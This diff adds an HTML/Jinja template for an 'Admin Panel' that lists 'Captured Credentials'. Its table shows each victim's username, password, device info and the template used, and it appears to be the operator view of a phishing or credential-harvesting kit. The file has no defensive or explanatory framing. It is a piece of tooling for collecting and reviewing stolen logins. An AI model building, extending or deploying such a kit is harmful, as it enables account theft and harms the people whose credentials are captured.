@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/admin.css') }}">
+</head>
+<body>
+    <h1>Captured Credentials</h1>
+    <table>
+        <tr>
+            <th>Template</th>
+            <th>Username</th>
+            <th>Password</th>
+            <th>Device Info</th>
+        </tr>
+        {% for cred in credentials %}
+        <tr>
+            <td>{{ cred.template }}</td>
+            <td>{{ cred.username }}</td>
+            <td>{{ cred.password }}</td>
+            <td>{{ cred.device }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
